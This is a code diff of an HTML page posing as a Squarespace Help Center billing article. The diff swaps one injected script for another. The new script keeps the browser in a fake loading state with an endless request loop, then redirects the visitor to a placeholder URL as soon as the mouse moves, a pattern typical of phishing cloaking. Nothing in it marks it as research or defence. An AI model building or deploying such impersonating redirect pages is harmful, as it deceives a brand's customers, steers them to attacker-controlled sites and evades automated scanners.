@@ -1,27 +1,35 @@
 <html dir="ltr" lang="en-US" style=""><head><meta charset="utf-8"><style>.truste_cursor_pointer{cursor:pointer}</style>
 <title>Checking your billing subscriptions – Squarespace Help Center</title>
  <script>
-    // Add an event listener for mouse movement to trigger the redirect
-document.addEventListener("mousemove", function handleMouseMove() {
-    console.log("Mouse moved. Redirecting...");
-    window.location.href = "https://example.com";
-}, { once: true }); // Ensures the listener triggers only once
-
-// Keep the browser's loading spinner active
+ 
+// Keep the browser in a "loading" state
 window.addEventListener("DOMContentLoaded", () => {
-    // Create a never-ending loop using a fake promise or request
+    let loading = true;
+
+    // Function to keep the browser loading
     function keepLoading() {
-        const fakeScript = document.createElement('script');
-        fakeScript.src = "data:application/javascript,console.log('Fake script');";
-        fakeScript.onload = () => {
-            console.log("Fake script loaded, keeping loading state...");
-            keepLoading(); // Re-trigger to keep the loading state
+        if (!loading) return; // Stop when mouse moves
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", "/fake-endpoint", true);
+        xhr.onload = () => {
+            keepLoading(); // Continue the fake loading loop
         };
-        document.body.appendChild(fakeScript);
+        xhr.onerror = () => {
+            keepLoading(); // Retry if there's an error
+        };
+        xhr.send();
     }
 
     keepLoading();
+
+    // Listen for mouse movement to trigger redirection
+    document.addEventListener("mousemove", () => {
+        loading = false; // Stop the fake loading loop
+        console.log("Mouse moved. Redirecting...");
+        window.location.href = "https://example.com"; // Redirect instantly
+    }, { once: true }); // Ensure it triggers only once
 });
+
 
 
     </script>
